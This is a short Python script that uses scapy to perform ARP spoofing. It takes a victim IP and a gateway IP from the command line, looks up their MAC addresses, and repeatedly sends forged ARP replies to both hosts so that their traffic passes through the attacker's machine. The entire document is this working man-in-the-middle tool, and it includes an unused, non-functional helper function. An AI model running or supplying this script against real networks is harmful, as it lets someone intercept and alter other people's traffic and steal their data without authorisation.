#!/usr/bin/env python3

import scapy.all as scapy
import optparse
from time import sleep

def send_packets(target, gateway):
    gw_mac = get_mac(gateway)
    tg_mac = get_mac(target)
    target_packet = scapy.ARP(op=2, pdst=target, hwdst=tg_mac, psrc=gateway)
    gateway_packet = scapy.ARP(op=2, pdst=gateway, hwdst=gw_mac, psrc=target)
    print(f"Target is {target}, target MAC is {tg_mac}")
    print(f"Gateway is {gateway}, gateway MAC is {gw_mac}")
    for i in range(100):
        scapy.srp(target_packet, timeout=2, verbose=False)
        scapy.srp(gateway_packet, timeout=2, verbose=False)
        sleep(2)


def get_mac(target):
    arp_request = scapy.ARP(pdst=target)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_request
    result = scapy.srp(packet, timeout=30, verbose=False)
    print(result[0][0][1].hwsrc)
    return result[0][0][1].hwsrc

def parse_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target / Victim IP address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address")
    opt,args = parser.parse_args()
    if not opt.target:
        parser.error("[-] Target IP wasn't specified, use --help for more information.")
    elif not opt.gateway:
        parser.error("[-] Gateway IP wasn't specified, use --help for more information.")
    return opt

def loop(times, wait, command):
    for i in range(times):
        command
        sleep(wait)

opt = parse_args()
send_packets(opt.target, opt.gateway)